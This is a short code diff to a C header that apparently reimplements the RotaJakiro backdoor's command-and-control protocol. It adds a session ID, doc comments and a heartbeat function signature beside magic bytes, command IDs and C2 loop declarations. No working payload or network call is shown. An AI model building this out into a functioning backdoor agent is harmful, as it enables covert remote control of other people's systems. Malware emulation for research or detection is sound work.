@@ -16,6 +16,7 @@
 
 //RotaJakiro Magic Headers
 const static unsigned char magicBytes[] = {0x3B, 0x91, 0x01, 0x10};
+const static unsigned char sessionId[] = {0x01, 0x02, 0x03, 0x04};
 const static unsigned char payloadLen[] = {0x0f};
 const static unsigned char keyLen[] = {0x00,0x00};
 const static unsigned char cmd_id[] = {0x13, 0x37, 0x00, 0x00};
@@ -41,6 +42,7 @@ const static unsigned char rota_c2_run_plugin_1[4] = {0x1B, 0x25, 0x50, 0x30};
 /**
  * @brief main c2 loop to process commands from handler
  * @param N/A
+ * @return N/A
  * */
 void c2_loop();
 
@@ -52,9 +54,11 @@ void c2_exit(int sock);
 
 
 /**
-* @brief ??? command-id: 0x5CCA727
+* @brief ping/pong between handler and agent command-id: 0x5CCA727
+* @params char * to cmd_id, integer value for socket
+* @return N/A
 **/
-void c2_heartbeat();
+void c2_heartbeat(char *cmd_id, int sock);
 
 /**
 * @brief update the c2 call back time command-id 0x17B1CC4
